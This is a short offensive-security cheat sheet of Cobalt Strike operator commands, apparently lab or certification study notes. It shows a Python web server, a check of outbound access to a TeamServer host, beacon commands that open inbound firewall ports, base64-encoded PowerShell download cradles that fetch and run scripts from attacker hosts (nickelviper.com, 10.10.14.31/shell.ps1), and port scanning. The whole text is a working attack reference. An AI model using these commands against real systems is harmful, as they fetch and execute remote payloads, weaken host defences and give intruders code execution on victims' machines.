### Python3 webserver
Run a python3 webserver:
```bash
$ python3 -m http.server
```

### Check outbound access to TeamServer
```powershell
$ iwr -Uri http://nickelviper.com/a
```

### Change firewall rules
Change incoming firewall rules:
```powershell
beacon> powerpick New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
beacon> powerpick Remove-NetFirewallRule -DisplayName "Test Rule"
```

### Powershell payload base64 encoding
Encode the powershell payload for handling extra quotes:

- Powershell:
```powershell
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```

- Linux:
```bash
$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
```

Finally,
```powershell
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```

### Checking open ports
Use you can check open ports using Cobalt Strike:
```
portscan [ip or ip range] [ports]
```